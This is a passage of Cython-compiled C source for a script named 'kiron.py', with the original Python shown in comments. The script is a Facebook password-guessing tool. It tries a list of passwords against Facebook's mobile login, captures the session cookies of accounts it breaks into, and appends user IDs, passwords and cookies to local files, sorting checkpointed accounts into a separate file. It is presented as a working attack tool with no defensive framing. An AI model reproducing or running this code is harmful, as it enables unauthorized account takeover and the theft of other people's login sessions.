          PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u__71);
          __pyx_t_14 = __Pyx_PyObject_FormatSimple(__pyx_v_coki, __pyx_empty_unicode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) : __pyx_t_5;
          __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_14);
          __Pyx_GIVEREF(__pyx_t_14);
          PyTuple_SET_ITEM(__pyx_t_7, 3, __pyx_t_14);
          __pyx_t_14 = 0;
          __pyx_t_14 = __Pyx_PyUnicode_Join(__pyx_t_7, 4, __pyx_t_17, __pyx_t_5); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_v_cookies = ((PyObject*)__pyx_t_14);
          __pyx_t_14 = 0;

          /* "kiron.py":443
 *                     if 'c_user' in log_cookies:
 *                            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"XD={ssbb};{coki}"
 *                            uidx=re.findall("c_user=(.*);xs", coki)[0]             # <<<<<<<<<<<<<<
 *                            uid=str(uidx)
 *                            ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
 */
          __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_re); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 443, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_findall); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 443, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = NULL;
          __pyx_t_9 = 0;
          #if CYTHON_UNPACK_METHODS
          if (unlikely(PyMethod_Check(__pyx_t_2))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_2);
            if (likely(__pyx_t_7)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
              __Pyx_INCREF(__pyx_t_7);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_2, function);
              __pyx_t_9 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[3] = {__pyx_t_7, __pyx_kp_s_c_user_xs, __pyx_v_coki};
            __pyx_t_14 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_9, 2+__pyx_t_9);
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 443, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          }
          __pyx_t_2 = __Pyx_GetItemInt(__pyx_t_14, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 443, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_v_uidx = __pyx_t_2;
          __pyx_t_2 = 0;

          /* "kiron.py":444
 *                            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"XD={ssbb};{coki}"
 *                            uidx=re.findall("c_user=(.*);xs", coki)[0]
 *                            uid=str(uidx)             # <<<<<<<<<<<<<<
 *                            ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
 *                            res=requests.get(ckk).text
 */
          __pyx_t_2 = __Pyx_PyObject_Str(__pyx_v_uidx); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 444, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF_SET(__pyx_v_uid, __pyx_t_2);
          __pyx_t_2 = 0;

          /* "kiron.py":445
 *                            uidx=re.findall("c_user=(.*);xs", coki)[0]
 *                            uid=str(uidx)
 *                            ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"             # <<<<<<<<<<<<<<
 *                            res=requests.get(ckk).text
 *                            if 'PhotosAYYUB' in res:
 */
          __pyx_t_2 = PyTuple_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 445, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_17 = 0;
          __pyx_t_5 = 127;
          __Pyx_INCREF(__pyx_kp_u_https_graph_facebook_com);
          __pyx_t_17 += 27;
          __Pyx_GIVEREF(__pyx_kp_u_https_graph_facebook_com);
          PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_https_graph_facebook_com);
          __pyx_t_14 = __Pyx_PyObject_FormatSimple(__pyx_v_uid, __pyx_empty_unicode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 445, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) : __pyx_t_5;
          __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_14);
          __Pyx_GIVEREF(__pyx_t_14);
          PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_14);
          __pyx_t_14 = 0;
          __Pyx_INCREF(__pyx_kp_u_picture_type_normal);
          __pyx_t_17 += 20;
          __Pyx_GIVEREF(__pyx_kp_u_picture_type_normal);
          PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_picture_type_normal);
          __pyx_t_14 = __Pyx_PyUnicode_Join(__pyx_t_2, 3, __pyx_t_17, __pyx_t_5); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 445, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_v_ckk = ((PyObject*)__pyx_t_14);
          __pyx_t_14 = 0;

          /* "kiron.py":446
 *                            uid=str(uidx)
 *                            ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
 *                            res=requests.get(ckk).text             # <<<<<<<<<<<<<<
 *                            if 'PhotosAYYUB' in res:
 *                                  print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m|\x1b[38;5;46m {ps}")
 */
          __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_requests); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 446, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_get); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 446, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_t_2 = NULL;
          __pyx_t_9 = 0;
          #if CYTHON_UNPACK_METHODS
          if (unlikely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_2)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_2);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
              __pyx_t_9 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_v_ckk};
            __pyx_t_14 = __Pyx_PyObject_FastCall(__pyx_t_7, __pyx_callargs+1-__pyx_t_9, 1+__pyx_t_9);
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 446, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          }
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_text); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 446, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_v_res = __pyx_t_7;
          __pyx_t_7 = 0;

          /* "kiron.py":447
 *                            ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
 *                            res=requests.get(ckk).text
 *                            if 'PhotosAYYUB' in res:             # <<<<<<<<<<<<<<
 *                                  print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m|\x1b[38;5;46m {ps}")
 *                                  print("\r\033[1;34m(\033[1;34m)\x1b[38;5;244m\x1b[38;5;46m \033[1;37m"+ coki)
 */
          __pyx_t_16 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_PhotosAYYUB, __pyx_v_res, Py_EQ)); if (unlikely((__pyx_t_16 < 0))) __PYX_ERR(0, 447, __pyx_L3_error)
          if (__pyx_t_16) {

            /* "kiron.py":448
 *                            res=requests.get(ckk).text
 *                            if 'PhotosAYYUB' in res:
 *                                  print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m|\x1b[38;5;46m {ps}")             # <<<<<<<<<<<<<<
 *                                  print("\r\033[1;34m(\033[1;34m)\x1b[38;5;244m\x1b[38;5;46m \033[1;37m"+ coki)
 *                                  print(f'\x1b[1;97m\033[1;37m')
 */
            __pyx_t_7 = PyTuple_New(4); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 448, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_17 = 0;
            __pyx_t_5 = 127;
            __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46mAYYUB_38_5_24);
            __pyx_t_5 = (1114111 > __pyx_t_5) ? 1114111 : __pyx_t_5;
            __pyx_t_17 += 53;
            __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46mAYYUB_38_5_24);
            PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u_38_5_244m_38_5_46mAYYUB_38_5_24);
            __pyx_t_14 = __Pyx_PyObject_FormatSimple(__pyx_v_uid, __pyx_empty_unicode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 448, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) : __pyx_t_5;
            __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_14);
            __Pyx_GIVEREF(__pyx_t_14);
            PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_14);
            __pyx_t_14 = 0;
            __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_5);
            __pyx_t_17 += 24;
            __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_5);
            PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u_38_5_244m_38_5_46m_5);
            __pyx_t_14 = __Pyx_PyObject_FormatSimple(__pyx_v_ps, __pyx_empty_unicode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 448, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) : __pyx_t_5;
            __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_14);
            __Pyx_GIVEREF(__pyx_t_14);
            PyTuple_SET_ITEM(__pyx_t_7, 3, __pyx_t_14);
            __pyx_t_14 = 0;
            __pyx_t_14 = __Pyx_PyUnicode_Join(__pyx_t_7, 4, __pyx_t_17, __pyx_t_5); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 448, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __pyx_t_7 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_14); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 448, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

            /* "kiron.py":449
 *                            if 'PhotosAYYUB' in res:
 *                                  print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m|\x1b[38;5;46m {ps}")
 *                                  print("\r\033[1;34m(\033[1;34m)\x1b[38;5;244m\x1b[38;5;46m \033[1;37m"+ coki)             # <<<<<<<<<<<<<<
 *                                  print(f'\x1b[1;97m\033[1;37m')
 *                                  open('/sdcard/AYYUB/RND-M1-OK-COKIE.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
 */
            __pyx_t_7 = PyNumber_Add(__pyx_kp_s_1_34m_1_34m_38_5_244m_38_5_46m, __pyx_v_coki); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 449, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_14 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_7); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 449, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

            /* "kiron.py":450
 *                                  print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m|\x1b[38;5;46m {ps}")
 *                                  print("\r\033[1;34m(\033[1;34m)\x1b[38;5;244m\x1b[38;5;46m \033[1;37m"+ coki)
 *                                  print(f'\x1b[1;97m\033[1;37m')             # <<<<<<<<<<<<<<
 *                                  open('/sdcard/AYYUB/RND-M1-OK-COKIE.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
 *                                  oks.append(uid)
 */
            __pyx_t_14 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 450, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

            /* "kiron.py":451
 *                                  print("\r\033[1;34m(\033[1;34m)\x1b[38;5;244m\x1b[38;5;46m \033[1;37m"+ coki)
 *                                  print(f'\x1b[1;97m\033[1;37m')
 *                                  open('/sdcard/AYYUB/RND-M1-OK-COKIE.txt','a').write(uid+'|'+ps+'|'+coki+'\n')             # <<<<<<<<<<<<<<
 *                                  oks.append(uid)
 *                                  break
 */
            __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__79, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 451, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_write); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 451, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __pyx_t_7 = PyNumber_Add(__pyx_v_uid, __pyx_kp_s__32); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 451, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_6 = PyNumber_Add(__pyx_t_7, __pyx_v_ps); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 451, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __pyx_t_7 = PyNumber_Add(__pyx_t_6, __pyx_kp_s__32); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 451, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = PyNumber_Add(__pyx_t_7, __pyx_v_coki); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 451, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __pyx_t_7 = PyNumber_Add(__pyx_t_6, __pyx_kp_s__33); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 451, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = NULL;
            __pyx_t_9 = 0;
            #if CYTHON_UNPACK_METHODS
            if (likely(PyMethod_Check(__pyx_t_2))) {
              __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_2);
              if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_2, function);
                __pyx_t_9 = 1;
              }
            }
            #endif
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_6, __pyx_t_7};
              __pyx_t_14 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_9, 1+__pyx_t_9);
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
              if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 451, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_14);
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            }
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

            /* "kiron.py":452
 *                                  print(f'\x1b[1;97m\033[1;37m')
 *                                  open('/sdcard/AYYUB/RND-M1-OK-COKIE.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
 *                                  oks.append(uid)             # <<<<<<<<<<<<<<
 *                                  break
 *                            else:
 */
            __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_oks); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 452, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __pyx_t_19 = __Pyx_PyObject_Append(__pyx_t_14, __pyx_v_uid); if (unlikely(__pyx_t_19 == ((int)-1))) __PYX_ERR(0, 452, __pyx_L3_error)
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

            /* "kiron.py":453
 *                                  open('/sdcard/AYYUB/RND-M1-OK-COKIE.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
 *                                  oks.append(uid)
 *                                  break             # <<<<<<<<<<<<<<
 *                            else:
 *                                  break
 */
            goto __pyx_L10_break;

            /* "kiron.py":447
 *                            ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
 *                            res=requests.get(ckk).text
 *                            if 'PhotosAYYUB' in res:             # <<<<<<<<<<<<<<
 *                                  print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m|\x1b[38;5;46m {ps}")
 *                                  print("\r\033[1;34m(\033[1;34m)\x1b[38;5;244m\x1b[38;5;46m \033[1;37m"+ coki)
 */
          }

          /* "kiron.py":455
 *                                  break
 *                            else:
 *                                  break             # <<<<<<<<<<<<<<
 *                     elif 'checkpoint' in log_cookies:
 *                             #print(f"\r\r\033[1;90m [XD]-[CP] {uid} | {ps}")
 */
          /*else*/ {
            goto __pyx_L10_break;
          }

          /* "kiron.py":441
 *                     po = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc', data=data, headers=head,allow_redirects=False,verify=True).text
 *                     log_cookies=session.cookies.get_dict().keys()
 *                     if 'c_user' in log_cookies:             # <<<<<<<<<<<<<<
 *                            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"XD={ssbb};{coki}"
 *                            uidx=re.findall("c_user=(.*);xs", coki)[0]
 */
        }

        /* "kiron.py":456
 *                            else:
 *                                  break
 *                     elif 'checkpoint' in log_cookies:             # <<<<<<<<<<<<<<
 *                             #print(f"\r\r\033[1;90m [XD]-[CP] {uid} | {ps}")
 *                             open('/sdcard/AYYUB/RND-CP.txt','a').write(uid+'|'+ps+'\n')
 */
        __pyx_t_16 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_checkpoint, __pyx_v_log_cookies, Py_EQ)); if (unlikely((__pyx_t_16 < 0))) __PYX_ERR(0, 456, __pyx_L3_error)
        if (__pyx_t_16) {

          /* "kiron.py":458
 *                     elif 'checkpoint' in log_cookies:
 *                             #print(f"\r\r\033[1;90m [XD]-[CP] {uid} | {ps}")
 *                             open('/sdcard/AYYUB/RND-CP.txt','a').write(uid+'|'+ps+'\n')             # <<<<<<<<<<<<<<
 *                             cps.append(uid)
 *                             break
 */
          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__80, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 458, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_write); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 458, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_t_2 = PyNumber_Add(__pyx_v_uid, __pyx_kp_s__32); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 458, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_6 = PyNumber_Add(__pyx_t_2, __pyx_v_ps); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 458, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_t_2 = PyNumber_Add(__pyx_t_6, __pyx_kp_s__33); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 458, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = NULL;
          __pyx_t_9 = 0;
          #if CYTHON_UNPACK_METHODS
          if (likely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
              __pyx_t_9 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_6, __pyx_t_2};
            __pyx_t_14 = __Pyx_PyObject_FastCall(__pyx_t_7, __pyx_callargs+1-__pyx_t_9, 1+__pyx_t_9);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 458, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          }
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

          /* "kiron.py":459
 *                             #print(f"\r\r\033[1;90m [XD]-[CP] {uid} | {ps}")
 *                             open('/sdcard/AYYUB/RND-CP.txt','a').write(uid+'|'+ps+'\n')
 *                             cps.append(uid)             # <<<<<<<<<<<<<<
 *                             break
 *                     else:
 */
          __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_cps); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 459, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_19 = __Pyx_PyObject_Append(__pyx_t_14, __pyx_v_uid); if (unlikely(__pyx_t_19 == ((int)-1))) __PYX_ERR(0, 459, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

          /* "kiron.py":460
 *                             open('/sdcard/AYYUB/RND-CP.txt','a').write(uid+'|'+ps+'\n')
 *                             cps.append(uid)
 *                             break             # <<<<<<<<<<<<<<
 *                     else:
 *                             continue
 */
          goto __pyx_L10_break;

          /* "kiron.py":456
 *                            else:
 *                                  break
 *                     elif 'checkpoint' in log_cookies:             # <<<<<<<<<<<<<<
 *                             #print(f"\r\r\033[1;90m [XD]-[CP] {uid} | {ps}")
 *                             open('/sdcard/AYYUB/RND-CP.txt','a').write(uid+'|'+ps+'\n')
 */
        }

        /* "kiron.py":462
 *                             break
 *                     else:
 *                             continue             # <<<<<<<<<<<<<<
 *             loop+=1
 *         except requests.exceptions.ConnectionError:
 */
        /*else*/ {
          goto __pyx_L9_continue;
        }

        /* "kiron.py":405
 *         sys.stdout.write(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-XD\x1b[38;5;244m] \x1b[38;5;244m[\x1b[38;5;81m{loop}\x1b[38;5;244m] \x1b[38;5;46mOK\033[1;37m|\x1b[38;5;46m{len(oks)} \x1b[38;5;81mCP\033[1;37m|\x1b[38;5;81m{len(cps)} ");sys.stdout.flush()
 *         try:
 *             for ps in passlist:             # <<<<<<<<<<<<<<
 *                     session = requests.Session()
 *                     free_fb = session.get('https://mbasic.facebook.com').text
 */
        __pyx_L9_continue:;
      }
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L19_for_end;
      __pyx_L10_break:;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L19_for_end;
      __pyx_L19_for_end:;

      /* "kiron.py":463
 *                     else:
 *                             continue
 *             loop+=1             # <<<<<<<<<<<<<<
 *         except requests.exceptions.ConnectionError:
 *             time.sleep(10)
 */
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_loop); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 463, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_14 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 463, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_14);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_loop, __pyx_t_14) < 0) __PYX_ERR(0, 463, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

      /* "kiron.py":404
 *         global loop,oks,cps
 *         sys.stdout.write(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-XD\x1b[38;5;244m] \x1b[38;5;244m[\x1b[38;5;81m{loop}\x1b[38;5;244m] \x1b[38;5;46mOK\033[1;37m|\x1b[38;5;46m{len(oks)} \x1b[38;5;81mCP\033[1;37m|\x1b[38;5;81m{len(cps)} ");sys.stdout.flush()
 *         try:             # <<<<<<<<<<<<<<
 *             for ps in passlist:
 *                     session = requests.Session()
 */
    }
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
    __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;

    /* "kiron.py":464
 *                             continue
 *             loop+=1
 *         except requests.exceptions.ConnectionError:             # <<<<<<<<<<<<<<
 *             time.sleep(10)
 * #__________________| FILE METHOD M1 |__________________#
 */
    __Pyx_ErrFetch(&__pyx_t_14, &__pyx_t_1, &__pyx_t_7);
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_requests); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 464, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_exceptions); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 464, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
